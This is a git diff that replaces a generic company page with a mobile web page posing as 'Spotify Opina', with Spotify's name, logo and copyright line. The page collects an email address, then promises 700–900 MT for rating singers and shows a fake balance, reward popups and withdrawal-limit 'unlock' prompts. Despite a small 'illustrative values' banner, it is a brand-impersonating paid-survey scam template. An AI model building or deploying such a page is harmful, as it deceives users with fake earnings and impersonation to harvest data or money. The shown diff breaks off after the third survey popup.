@@ -1,77 +1,2057 @@
 <!DOCTYPE html>
-<html lang="pt">
+<html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>VisionPay - Página Oficial</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #f4f4f4;
-      margin: 0;
-      padding: 0;
-    }
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Spotify Opina | Avalie</title>
+    <link rel="icon" href="images/spotifylogo.png" type="image/png">
+    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500&display=swap" rel="stylesheet">
 
-    .container {
-      max-width: 800px;
-      margin: 60px auto;
-      padding: 40px;
-      background: #ffffff;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.05);
-    }
+    <style>
+        body {
+            background-color: #f0f4f8;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            padding-top: 75px;
+        }
 
-    h1 {
-      color: #0e8a57;
-      font-size: 30px;
-    }
+        /* Alerta de simulacao fixo */
+        .simulation-alert {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            background-color: #ff9800;
+            color: #fff;
+            text-align: center;
+            padding: 12px 15px;
+            font-weight: normal;
+            font-size: 13px;
+            line-height: 1.5;
+            z-index: 10001;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+        }
 
-    h2 {
-      color: #0e8a57;
-      font-size: 22px;
-      margin-top: 30px;
-    }
+        /* Menu de cima */
+        .menu {
+            position: fixed;
+            top: 75px;
+            width: 100%;
+            height: 70px;
+            background: linear-gradient(180deg, #f0f4f8, #fff);
+            display: flex;
+            margin: 0 auto;
+            justify-content: space-between;
+            padding: 5px;
+            box-sizing: border-box;
+            z-index: 9998;
+            border-radius: 0px 0px 20px 20px;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.3);
+        }
 
-    p {
-      font-size: 16px;
-      line-height: 1.6;
-      color: #333;
-    }
+        .menu::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(180deg, #f0f4f8, #fff);
+            z-index: -1;
+            border-radius: 20px;
+        }
 
-    a {
-      color: #0e8a57;
-      text-decoration: none;
-    }
+        .menu a {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            color: #fff;
+        }
 
-    .footer {
-      margin-top: 40px;
-      font-size: 14px;
-      color: #777;
-    }
-  </style>
+        .menu a img {
+            max-width: 100%;
+            max-height: 100%;
+            display: block;
+        }
+
+        .buttons-container {
+            display: flex;
+            align-items: center;
+            padding: 10px;
+        }
+
+        .valor-box {
+            width: 130px;
+            height: 25px;
+            background-color: #06B32E;
+            border-radius: 12px;
+            padding: 10px;
+            align-items: center;
+            line-height: 25px;
+            display: block;
+            margin: 0 auto;
+        }
+
+        .valor-box-saque {
+            width: 99%;
+            height: 100%;
+            background-color: #fff;
+            border-radius: 20px;
+            align-items: center;
+            line-height: 20px;
+            display: block;
+            justify-content: center;
+            margin: 0 auto;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1);
+            padding-top: 10px;
+            padding-bottom: 40px;
+        }
+
+        .valor-box span {
+            font-weight: bold;
+            font-size: 20px;
+        }
+
+        #valor {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            font-size: 20px;
+            color: white;
+        }
+
+        #valor-saque {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            font-size: 21px;
+        }
+
+        #valor-money {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-weight: bold;
+            font-size: 21px;
+        }
+
+        /* Menu de baixo */
+        .menuemb {
+            position: fixed;
+            bottom: 1%;
+            width: 95%;
+            left: 2.5%;
+            right: 2.5%;
+            background: linear-gradient(180deg, #fff, #fff);
+            display: flex;
+            margin: 0 auto;
+            justify-content: space-between;
+            padding: 10px;
+            box-sizing: border-box;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1);
+            border-radius: 20px;
+            z-index: 9995;
+        }
+
+        .menuemb a {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-decoration: none;
+            color: #fff;
+            height: 50px;
+        }
+
+        .menuemb a img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        /* BOTOES LIKE E DISLIKE */
+        .like-dislike-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 0px;
+        }
+
+        .like-button, .dislike-button {
+            border: 2px solid;
+            padding: 10px;
+            cursor: pointer;
+            transition: background-color 0.2s, color 0.2s;
+            text-align: center;
+            margin: 0 auto;
+            right: 5%;
+            left: 5%;
+        }
+
+        .like-button {
+            border-color: green;
+            color: green;
+            width: 49%;
+            right: 5%;
+            left: 5%;
+            border-radius: 8px;
+        }
+
+        .dislike-button {
+            border-color: red;
+            color: red;
+            width: 49%;
+            right: 5%;
+            left: 5%;
+            border-radius: 8px;
+        }
+
+        .liked {
+            background: linear-gradient(180deg, green, green);
+            color: #fff;
+        }
+
+        .disliked {
+            background: linear-gradient(180deg, red, red);
+            color: #fff;
+        }
+
+        .button-container {
+            display: flex;
+            margin: 0 auto;
+            width: 90%;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .square-button {
+            border-radius: 12px;
+            border: none;
+            aspect-ratio: 1 / 1;
+            margin: 5px;
+            background-color: #fff;
+            color: #fff;
+            cursor: pointer;
+            transition: transform 0.2s, background-color 0.2s;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .square-button img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .square-button.active {
+            background-color: #06B32E;
+            transform: scale(1.1);
+        }
+
+        .input-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 10px;
+            box-sizing: border-box;
+            display: flex;
+            margin: 0 auto;
+        }
+
+        .input-container input[type="text"] {
+            width: 100%;
+            font-size: 15px;
+            color: #303030;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            display: flex;
+            margin: 0 auto;
+        }
+
+        /* POPUP SAQUE */
+        .popup-container {
+            position: fixed;
+            border-radius: 15px;
+            top: 50%;
+            left: 50%;
+            width: 90%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            padding-bottom: 20px;
+            padding-top: 20px;
+            box-shadow: 0 0 100px rgba(0, 0, 0, 100);
+            display: none;
+            z-index: 10000;
+        }
+
+        .popup-container2 {
+            display: none;
+            margin: 0 auto;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #292929;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            z-index: 9997;
+            opacity: 100%;
+            color: white;
+            box-shadow: 0 0 100px rgba(0, 0, 0, 100);
+        }
+
+        .popup-text {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 10px;
+            display: block;
+            text-align: center;
+        }
+
+        .popup-button {
+            background-color: #FF0000;
+            width: 95%;
+            border-radius: 8px;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 14px;
+            cursor: pointer;
+            display: block;
+            margin: 0 auto;
+        }
+
+        .desbloquear-button {
+            background-color: #06B32E;
+            width: 90%;
+            border-radius: 8px;
+            color: #fff;
+            border: none;
+            height: 40px;
+            font-size: 14px;
+            cursor: pointer;
+            display: block;
+            margin: 0 auto;
+            box-sizing: border-box;
+        }
+
+        /* POPUP LIMITE DE SAQUE */
+        .popup-containerL {
+            position: fixed;
+            border-radius: 15px;
+            top: 50%;
+            left: 50%;
+            width: 90%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            padding-bottom: 20px;
+            padding-top: 20px;
+            box-shadow: 0 0 350px rgba(0, 0, 0, 1);
+            display: none;
+            z-index: 10000;
+        }
+
+        .popup-textL {
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 10px;
+            display: block;
+            text-align: center;
+        }
+
+        .popup-buttonL {
+            background-color: #FF0000;
+            width: 95%;
+            border-radius: 8px;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 14px;
+            cursor: pointer;
+            display: block;
+            margin: 0 auto;
+        }
+
+        .desbloquear-buttonL {
+            background: linear-gradient(135deg, #28a745, #06641c);
+            width: 95%;
+            border-radius: 8px;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 14px;
+            cursor: pointer;
+            display: block;
+            margin: 0 auto;
+        }
+
+        /* Style dos icones do Google */
+        .material-symbols-outlined {
+            font-variation-settings: 'FILL' 1, 'wght' 600, 'GRAD' 0, 'opsz' 30;
+        }
+
+        /* Barra de carregamento */
+        #progress-bar {
+            width: 95%;
+            height: 20px;
+            background-color: #ddd;
+            position: relative;
+            border-radius: 8px;
+            overflow: hidden;
+            margin: 0 auto;
+        }
+
+        #progress-bar div {
+            height: 100%;
+            position: absolute;
+            left: 0;
+            top: 0;
+            background-color: #ff0000;
+            animation: progress 86400s linear;
+            animation-fill-mode: forwards;
+            animation-iteration-count: 1;
+        }
+
+        @keyframes progress {
+            from { width: 0%; }
+            to { width: 100%; }
+        }
+
+        /* Caixa de login */
+        .loginbox {
+            width: 90%;
+            height: 250px;
+            background-color: #d9d9d9;
+            border-radius: 20px;
+            display: block;
+            margin: 0 auto;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .input-container {
+            width: 100%;
+            max-width: 400px;
+            padding: 10px;
+            box-sizing: border-box;
+        }
+
+        .input-container label {
+            display: block;
+            font-size: 17px;
+            font-weight: bold;
+            color: #007bff;
+            margin-bottom: 10px;
+        }
+
+        .input-container input[type="text"] {
+            width: 96%;
+            font-size: 15px;
+            color: #007bff;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Estilo para a bolinha girando */
+        .loading-spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 4px solid rgba(0, 0, 0, 0.3);
+            border-top: 4px solid #28a745;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+            vertical-align: middle;
+        }
+
+        .prosseguir-button {
+            background-color: #06B32E;
+            width: 90%;
+            border-radius: 12px;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            display: block;
+            font-weight: bold;
+            margin: 0 auto;
+        }
+
+        .prosseguir-button1 {
+            background: linear-gradient(135deg, #28a745, #06641c);
+            width: 90%;
+            border-radius: 8px;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            font-size: 14px;
+            cursor: pointer;
+            display: block;
+            margin: 0 auto;
+        }
+
+        .criar-conta {
+            background-color: #fff;
+            width: 90%;
+            border-radius: 8px;
+            color: rgb(101, 101, 101);
+            border: none;
+            padding: 10px 20px;
+            font-size: 14px;
+            cursor: pointer;
+            display: block;
+            margin: 0 auto;
+        }
+
+        /* Notificacao de dinheiro */
+        .notificacaoDinheiro {
+            display: none;
+            margin: 0 auto;
+            position: fixed;
+            top: -100px;
+            left: 0;
+            right: 0;
+            color: #333;
+            text-align: center;
+            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.4);
+            background-image: linear-gradient(125deg, #5575FD, #2B50F0);
+            z-index: 9999;
+            height: 50px;
+            width: 60%;
+            border-radius: 20px;
+            padding-bottom: 10px;
+            padding-top: 10px;
+        }
+
+        .notificacaoDinheiro.activeDinheiro {
+            display: block;
+            animation: slideInDinheiro 0.5s forwards;
+        }
+
+        .notificacaoDinheiro.activeDinheiro.slideOutDinheiro {
+            animation: slideOutDinheiro 0.5s forwards;
+        }
+
+        @keyframes slideInDinheiro {
+            from { top: -100px; }
+            to { top: 0; }
+        }
+
+        @keyframes slideOutDinheiro {
+            from { top: 0; }
+            to { top: -100px; }
+        }
+
+        /* Slogan inicio */
+        .slogan-inicio {
+            display: flex;
+            margin: 0 auto;
+            justify-content: center;
+            align-items: center;
+            background-color: #7a7a7a;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1);
+            height: 70px;
+            width: 95%;
+            border-radius: 20px;
+            padding-top: 15px;
+            padding-bottom: 15px;
+            padding-left: 15px;
+            padding-right: 15px;
+        }
+
+        .outer-box {
+            width: 90%;
+            display: flex;
+            margin: 0 auto;
+            border-radius: 10px;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .outer-box-login {
+            width: 90%;
+            display: flex;
+            margin: 0 auto;
+            border-radius: 10;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .center-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+
+        .white-box {
+            display: block;
+            margin: 0 auto;
+            background-color: #fff;
+            height: 100%;
+            width: 99%;
+            border-radius: 10px;
+            padding-top: 20px;
+            padding-bottom: 22px;
+        }
+
+        .imagem {
+            display: block;
+            margin: 0 auto;
+            background-color: #fff;
+            height: 100%;
+            width: 90%;
+            border-radius: 20px;
+            padding-top: 20px;
+            padding-bottom: 20px;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .white-box-login {
+            display: block;
+            margin: 0 auto;
+            background-color: #fff;
+            height: 100%;
+            width: 99%;
+            border-radius: 20px;
+            padding-top: 20px;
+            padding-bottom: 22px;
+        }
+
+        .footer-text {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            text-align: center;
+            color: #ffffff;
+            padding: 10px;
+            box-sizing: border-box;
+            padding-bottom: 20px;
+        }
+
+        .wbc {
+            text-align: center;
+            color: white;
+            font-family: 'Montserrat', sans-serif;
+        }
+
+        .gerarCodigo {
+            display: flex;
+            justify-content: center;
+            margin: 0 auto;
+            background: linear-gradient(180deg, #28a745, #28a745);
+            border: 0;
+            color: white;
+            border-radius: 8px;
+            width: 50%;
+            height: 30px;
+            line-height: 27px;
+            font-size: 16px;
+        }
+
+        .gerarCodigo2 {
+            display: flex;
+            justify-content: center;
+            margin: 0 auto;
+            background: linear-gradient(180deg, #28a745, #28a745);
+            border: 0;
+            color: white;
+            font-weight: bold;
+            border-radius: 12px;
+            width: 85%;
+            height: 35px;
+            line-height: 30px;
+            font-size: 16px;
+        }
+
+        .centro {
+            background-color: white;
+            height: 100%;
+            width: 95%;
+            left: 2.5%;
+            display: flex;
+            margin: 0 auto;
+            border-radius: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+
+        .form-label, .form-input {
+            border-radius: 12px;
+            width: 90%;
+            justify-content: center;
+            display: flex;
+            margin: 0 auto;
+            box-sizing: border-box;
+            text-align: center;
+            font-size: 16px;
+        }
+
+        .form-input {
+            border: 1px solid #202020;
+            height: 40px;
+            line-height: 40px;
+        }
+
+        .form-label {
+            height: 35px;
+            color: white;
+            font-family: 'Montserrat', sans-serif;
+            background-color: rgb(99, 99, 99);
+            line-height: 35px;
+            margin-bottom: 15px;
+        }
+
+        #container-progresso {
+            position: relative;
+            width: 200px;
+            height: 100px;
+            text-align: center;
+        }
+
+        #barra-progresso-svg {
+            width: 100%;
+            height: 100%;
+        }
+
+        #minha-barra-progresso {
+            stroke-linecap: round;
+            stroke-dasharray: 0 100;
+            animation: preencherAnimacao 2.5s linear forwards;
+        }
+
+        @keyframes preencherAnimacao {
+            100% { stroke-dasharray: 100 1; }
+        }
+
+        #texto-progresso {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #28a745;
+        }
+
+        #meu-valor-progresso {
+            display: block;
+            font-size: 1.2em;
+            font-weight: bold;
+        }
+
+        .faq-container {
+            width: 90%;
+            display: block;
+            margin: 0 auto;
+            max-width: 600px;
+            border-radius: 8px;
+            color: #fff;
+        }
+
+        .faq-item {
+            margin-bottom: 16px;
+            border: 1px solid #f0f4f8;
+            border-radius: 12px;
+        }
+
+        .question {
+            padding: 16px;
+            background-color: #fff;
+            cursor: pointer;
+            border-radius: 8px;
+            font-family: 'Montserrat', sans-serif;
+            color: rgb(101, 101, 101);
+            font-weight: bold;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .answer {
+            padding: 16px;
+            display: none;
+            background-color: #06B32E;
+            color: white;
+        }
+
+        .answer.active {
+            display: block;
+            border-radius: 8px;
+        }
+
+        .faq-title {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 25px;
+            color: #06B32E;
+            text-align: center;
+        }
+
+        .rating-container {
+            display: flex;
+            width: 95%;
+            margin: 0 auto;
+        }
+
+        .rating-button {
+            background-color: rgb(226, 226, 226);
+            border: none;
+            width: 95%;
+            height: 40px;
+            padding: 10px;
+            margin: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: bold;
+            color: rgb(101, 101, 101);
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .rating-button.active {
+            background-color: #06B32E;
+            color: white;
+        }
+
+        .pergunta-whats {
+            font-size: 16px;
+            text-align: center;
+            font-weight: bold;
+            color: rgb(101, 101, 101);
+            padding-left: 10%;
+            padding-right: 10%;
+            margin-top: 25px;
+            margin-bottom: 5px;
+        }
+
+        .enviarCodigo {
+            background-color: #06B32E;
+            width: 93%;
+            padding: 10px;
+            border-radius: 5px;
+            color: #fff;
+            border: none;
+            height: 40px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            display: block;
+            margin: 0px auto;
+            box-sizing: border-box;
+            margin-top: 15px;
+        }
+
+        .card__satisfacao {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .card__satisfacao h2, .card__resposta h2 {
+            text-align: center;
+            font-size: 16px;
+            font-weight: 400;
+            letter-spacing: 0.5px;
+        }
+
+        .card__gradeContainer {
+            display: grid;
+            width: 90%;
+            grid-template-rows: 1fr;
+            grid-template-columns: 1fr 1fr 1fr 1fr 1fr;
+            grid-gap: 10px;
+            margin-top: 20px;
+        }
+
+        .card__grade {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 5px;
+            transition: all ease 0.3s;
+        }
+
+        .card__grade i {
+            font-size: 32px;
+            color: #7e7e7e;
+        }
+
+        .card__gradeDescricao {
+            width: 90%;
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            margin: 5px 0px 0px 0px;
+            color: #7e7e7e;
+        }
+
+        .button-container {
+            display: grid;
+            grid-template-columns: repeat(2, minmax(120px, 1fr));
+            gap: 12px;
+        }
+
+        .square-button {
+            position: relative;
+            aspect-ratio: 1 / 1;
+            width: 100%;
+            border: 3px solid transparent;
+            border-radius: 16px;
+            background: #fff;
+            padding: 0;
+            cursor: pointer;
+            overflow: hidden;
+            transition: transform 0.08s ease, border-color 0.15s ease, box-shadow 0.15s ease;
+        }
+
+        .square-button:hover {
+            transform: translateY(-1px);
+        }
+
+        .square-button img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .square-button.is-selected {
+            border-color: #4ade80;
+            box-shadow: 0 0 10px rgba(74, 222, 128, 0.6);
+        }
+
+        /* Estilos para a página de vídeo */
+        .video-page {
+            background-color: #fff;
+            min-height: 100vh;
+            padding-top: 75px;
+        }
+
+        .video-header {
+            background-color: #06B32E;
+            color: white;
+            padding: 20px;
+            text-align: center;
+            font-size: 18px;
+            font-weight: bold;
+            line-height: 1.4;
+        }
+
+        .saldo-display {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .saldo-display img {
+            width: 100px;
+        }
+
+        .saldo-box {
+            border: 2px solid #06B32E;
+            border-radius: 10px;
+            padding: 10px 20px;
+            text-align: center;
+        }
+
+        .saldo-label {
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 5px;
+        }
+
+        .saldo-valor {
+            font-size: 18px;
+            font-weight: bold;
+            color: #06B32E;
+            font-family: 'Montserrat', sans-serif;
+        }
+
+        .video-section {
+            padding: 20px;
+        }
+
+        .video-title {
+            font-size: 24px;
+            font-weight: bold;
+            color: #06B32E;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+
+        .video-subtitle {
+            font-size: 16px;
+            color: #333;
+            text-align: center;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .video-container {
+            width: 100%;
+            margin: 0 auto;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <h1>VisionPay</h1>
-    <p>Bem-vindo à página oficial da <strong>VisionPay</strong>.</p>
 
-    <p>Somos uma empresa digital especializada em criar experiências online modernas e funcionais. Atuamos no desenvolvimento de soluções interativas, acessíveis e orientadas para o futuro. Nosso foco é utilizar tecnologia para simplificar a vida de pessoas e empresas no ambiente digital.</p>
+<!-- Alerta de Simulacao -->
+<div class="simulation-alert">
+    ⚠️ Nota Importante: Os valores apresentados são meramente ilustrativos e não representam ganhos reais. Esta é apenas uma demonstração.
+</div>
 
-    <h2>O que fazemos</h2>
-    <p>Trabalhamos com ferramentas de gestão digital, plataformas interativas e soluções web com design intuitivo e foco em acessibilidade. Nosso objetivo é ajudar negócios e pessoas a navegarem no mundo online com mais praticidade, segurança e profissionalismo.</p>
+<!-- Audio -->
+<audio id="meuAudio"><source src="media/dinheiro.mp3" type="audio/mp3"></audio>
 
-    <h2>Compromisso</h2>
-    <p>A VisionPay tem como prioridade a experiência do usuário. Investimos continuamente em boas práticas, acessibilidade e comunicação transparente para garantir um ambiente confiável e eficiente para todos os nossos visitantes.</p>
-
-    <h2>Contato</h2>
-    <p>Email: suporte@visionpay.site<br>
-    WhatsApp: +258 84 XXX XXXX</p>
-
-    <p><a href="/privacidade">Política de Privacidade</a></p>
-
-    <div class="footer">
-      &copy; 2025 VisionPay. Todos os direitos reservados.
+<!-- Pagina de login -->
+<div id="login" style="display: block;">
+    <div style="padding-top:30%;"></div>
+    <div class="outer-box-login">
+        <div class="white-box-login">
+            <img src="images/opinilogo.png" style="width:30%; margin: 0 auto; display: flex;">
+            <p class="popup-textL" style="text-align: center; color: rgb(101, 101, 101); font-weight: bold; font-size: 18px;">
+                Bem-vindo(a) ao SpotifyOpina
+            </p>
+            <p class="popup-textL" style="text-align: center; color: rgb(101, 101, 101); font-size: 15px;">
+                Insira seu e-mail para prosseguir!
+            </p>
+            <input class="form-input" id="email" name="email" placeholder="E-mail" style="margin-top:20px;" type="text">
+            <button class="prosseguir-button" id="prosseguir-button" onclick="verificarCampos()" style="margin-top: 15px;">
+                ENTRAR
+            </button>
+            <div style="margin-bottom: 10px;"></div>
+        </div>
     </div>
-  </div>
+    <div class="footer-text">
+        <p style="text-align: center; color: rgb(101, 101, 101); font-size: 15px; margin-top: 30px; font-weight: bold;">
+            2024 Spotify LLC
+        </p>
+        <p style="text-align: center; color: rgb(101, 101, 101); font-size: 14px; margin-top: -10px; margin-bottom: 0px;">
+            Termos e Politica de Privacidade
+        </p>
+    </div>
+</div>
+
+<!-- Pagina Inicio -->
+<div id="inicio" style="display: none;">
+    <div class="menu">
+        <a style="width: 30%;"><img src="images/opinilogo.png" style="width: 110px;"></a>
+        <div class="buttons-container" onclick="mostrarPagina('saque')" style="width: 45%;">
+            <div class="valor-box">
+                <span id="valor" style="font-family: 'Montserrat', sans-serif; max-width: 100%;">1000 MT</span>
+            </div>
+        </div>
+    </div>
+
+    <div style="margin-bottom: 100px;"></div>
+
+    <!-- Anuncio 1 -->
+    <div class="outer-box" id="ad1" style="display: block;">
+        <div class="white-box">
+            <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">
+                Responda e ganhe 800 MT!
+            </p>
+            <div class="imagem">
+                <img src="images/Mrbow.jpg" style="width: 50%; margin: 0 auto; display: flex; border-radius: 15px;">
+            </div>
+            <p class="pergunta-whats">De 1 a 5, qual nota você daria para as músicas de Mr. Bow?</p>
+            <div class="rating-container" id="rating-container-1">
+                <button class="rating-button" data-rating="1">1</button>
+                <button class="rating-button" data-rating="2">2</button>
+                <button class="rating-button" data-rating="3">3</button>
+                <button class="rating-button" data-rating="4">4</button>
+                <button class="rating-button" data-rating="5">5</button>
+            </div>
+            <p class="pergunta-whats">Recomendaria o cantor Mr. Bow para seus amigos e familiares?</p>
+            <div class="rating-container" id="rating-container-2">
+                <button class="rating-button" data-rating="1">Sim</button>
+                <button class="rating-button" data-rating="2">Não</button>
+            </div>
+            <p class="pergunta-whats">Qual faixa etária você acha que mais escuta o cantor Mr. Bow?</p>
+            <div class="rating-container" id="rating-container-3">
+                <button class="rating-button" data-rating="1">-18 anos</button>
+                <button class="rating-button" data-rating="2">+18 anos</button>
+            </div>
+            <button class="enviarCodigo" id="B1" onclick="showLoadingB1();" type="button">Enviar respostas</button>
+        </div>
+    </div>
+
+    <!-- Popup B1 -->
+    <div class="popup-container" id="popupB1">
+        <script src="https://unpkg.com/@dotlottie/player-component@latest/dist/dotlottie-player.mjs" type="module"></script>
+        <dotlottie-player autoplay background="transparent" loop speed="1"
+            src="https://lottie.host/dfcc0486-0a2c-42d7-b454-1922410a517d/ccVkLniJIv.json"
+            style="width: 200px; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;">
+        </dotlottie-player>
+        <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
+        <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">
+            800 MT
+        </span>
+    </div>
+
+    <!-- Anuncio 2 -->
+    <div class="outer-box" id="ad2" style="display: none;">
+        <div class="white-box">
+            <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">
+                Responda e ganhe 900 MT!
+            </p>
+            <div class="imagem">
+                <img src="images/TwentyFingers.jpg" style="width: 70%; margin: 0 auto; display: flex; border-radius: 15px;">
+            </div>
+            <p class="pergunta-whats">De 1 a 5, qual nota você daria para as músicas do Twenty Fingers?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">1</button>
+                <button class="rating-button" data-rating="2">2</button>
+                <button class="rating-button" data-rating="3">3</button>
+                <button class="rating-button" data-rating="4">4</button>
+                <button class="rating-button" data-rating="5">5</button>
+            </div>
+            <p class="pergunta-whats">Recomendaria o cantor Twenty Fingers para seus amigos e familiares?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">Sim</button>
+                <button class="rating-button" data-rating="2">Não</button>
+            </div>
+            <p class="pergunta-whats">Qual faixa etária você acha que mais escuta o cantor Twenty Fingers?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">-18 anos</button>
+                <button class="rating-button" data-rating="2">+18 anos</button>
+            </div>
+            <button class="enviarCodigo" id="B2" onclick="showLoadingB2();" type="button">Enviar respostas</button>
+        </div>
+    </div>
+
+    <!-- Popup B2 -->
+    <div class="popup-container" id="popupB2">
+        <dotlottie-player autoplay background="transparent" loop speed="1"
+            src="https://lottie.host/dfcc0486-0a2c-42d7-b454-1922410a517d/ccVkLniJIv.json"
+            style="width: 200px; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;">
+        </dotlottie-player>
+        <span class="popup-text" style="font-size: 20px;">Voce recebeu:</span>
+        <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -10px; color: #06B32E;">
+            900 MT
+        </span>
+    </div>
+
+    <!-- Anuncio 3 - Messias Maricoa -->
+    <div class="outer-box" id="ad3" style="display: none;">
+        <div class="white-box">
+            <p style="font-size: 22px; text-align: center; font-weight: bold; margin-top: 0px; margin-bottom: 15px; color: #06B32E;">
+                Responda e ganhe 700 MT!
+            </p>
+            <div class="imagem">
+                <img src="images/Messias Maricoa.jpg" style="width: 50%; margin: 0 auto; display: flex; border-radius: 15px;">
+            </div>
+            <p class="pergunta-whats">De 1 a 5, qual nota você daria para as músicas do Messias Maricoa?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">1</button>
+                <button class="rating-button" data-rating="2">2</button>
+                <button class="rating-button" data-rating="3">3</button>
+                <button class="rating-button" data-rating="4">4</button>
+                <button class="rating-button" data-rating="5">5</button>
+            </div>
+            <p class="pergunta-whats">Recomendaria o cantor Messias Maricoa para seus amigos e familiares?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">Sim</button>
+                <button class="rating-button" data-rating="2">Não</button>
+            </div>
+            <p class="pergunta-whats">Qual faixa etária você acha que mais escuta o cantor Messias Maricoa?</p>
+            <div class="rating-container">
+                <button class="rating-button" data-rating="1">-18 anos</button>
+                <button class="rating-button" data-rating="2">+18 anos</button>
+            </div>
+            <button class="enviarCodigo" id="B3" onclick="showLoadingB3();" type="button">Enviar respostas</button>
+        </div>
+    </div>
+
+    <!-- Popup B3 -->
+    <div class="popup-container" id="popupB3">
+        <dotlottie-player autoplay background="transparent" loop speed="1"
+            src="https://lottie.host/dfcc0486-0a2c-42d7-b454-1922410a517d/ccVkLniJIv.json"
+            style="width: 200px; height: 200px; display: flex; margin: 0 auto; margin-top: -20px; margin-bottom: -20px;">
+        </dotlottie-player>
